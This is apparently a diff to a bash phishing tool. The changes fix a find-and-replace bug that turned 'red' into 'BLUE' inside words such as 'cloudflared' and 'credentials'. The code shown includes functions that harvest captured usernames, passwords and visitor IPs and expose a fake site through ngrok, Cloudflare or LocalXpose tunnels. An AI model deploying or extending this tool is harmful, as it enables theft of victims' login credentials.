@@ -136,7 +136,7 @@ reset_color() {
 
 ## Kill already running process
 kill_pid() {
-	check_PID="php ngrok cloudflaBLUE loclx"
+	check_PID="php ngrok cloudflared loclx"
 	for process in ${check_PID}; do
 		if [[ $(pidof ${process}) ]]; then # Check for Process
 			killall ${process} > /dev/null 2>&1 # Kill the Process
@@ -171,7 +171,7 @@ banner_small() {
 
 ## Dependencies
 dependencies() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing requiBLUE packages..."
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
 
 	if [[ -d "/data/data/com.termux/files/home" ]]; then
 		if [[ ! $(command -v proot) ]]; then
@@ -237,7 +237,7 @@ download() {
 		chmod +x .server/$output > /dev/null 2>&1
 		rm -rf "$file"
 	else
-		echo -e "\n${BLUE}[${WHITE}!${BLUE}]${BLUE} Error occuBLUE while downloading ${output}."
+		echo -e "\n${BLUE}[${WHITE}!${BLUE}]${BLUE} Error occured while downloading ${output}."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -261,21 +261,21 @@ install_ngrok() {
 	fi
 }
 
-## Install CloudflaBLUE
-install_cloudflaBLUE() {
-	if [[ -e ".server/cloudflaBLUE" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} CloudflaBLUE already installed."
+## Install Cloudflared
+install_cloudflared() {
+	if [[ -e ".server/cloudflared" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing CloudflaBLUE..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://github.com/cloudflare/cloudflaBLUE/releases/latest/download/cloudflaBLUE-linux-arm' 'cloudflaBLUE'
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflaBLUE/releases/latest/download/cloudflaBLUE-linux-arm64' 'cloudflaBLUE'
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflaBLUE/releases/latest/download/cloudflaBLUE-linux-amd64' 'cloudflaBLUE'
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
 		else
-			download 'https://github.com/cloudflare/cloudflaBLUE/releases/latest/download/cloudflaBLUE-linux-386' 'cloudflaBLUE'
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
 		fi
 	fi
 }
@@ -386,7 +386,7 @@ capture_ip() {
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
-## Get cBLUEentials
+## Get credentials
 capture_cBLUEs() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
@@ -441,18 +441,18 @@ start_ngrok() {
 	capture_data
 }
 
-## Start CloudflaBLUE
-start_cloudflaBLUE() { 
+## Start Cloudflared
+start_cloudflared() { 
     rm .cld.log > /dev/null 2>&1 &
         cusport
 	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Launching CloudflaBLUE..."
+	echo -ne "\n\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Launching Cloudflared..."
 
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflaBLUE tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	else
-		sleep 2 && ./.server/cloudflaBLUE tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	fi
 
 	{ sleep 8; clear; banner_small; }
@@ -521,7 +521,7 @@ tunnel_menu() {
 
 		${BLUE}[${WHITE}01${BLUE}]${ORANGE} Localhost
 		${BLUE}[${WHITE}02${BLUE}]${ORANGE} Ngrok.io     ${BLUE}[${CYAN}Account Needed${BLUE}]
-		${BLUE}[${WHITE}03${BLUE}]${ORANGE} CloudflaBLUE  ${BLUE}[${CYAN}Auto Detects${BLUE}]
+		${BLUE}[${WHITE}03${BLUE}]${ORANGE} Cloudflared  ${BLUE}[${CYAN}Auto Detects${BLUE}]
 		${BLUE}[${WHITE}04${BLUE}]${ORANGE} LocalXpose   ${BLUE}[${CYAN}NEW! Max 15Min${BLUE}]
 
 	EOF
@@ -841,6 +841,6 @@ main_menu() {
 kill_pid
 dependencies
 install_ngrok
-install_cloudflaBLUE
+install_cloudflared
 install_localxpose
 main_menu
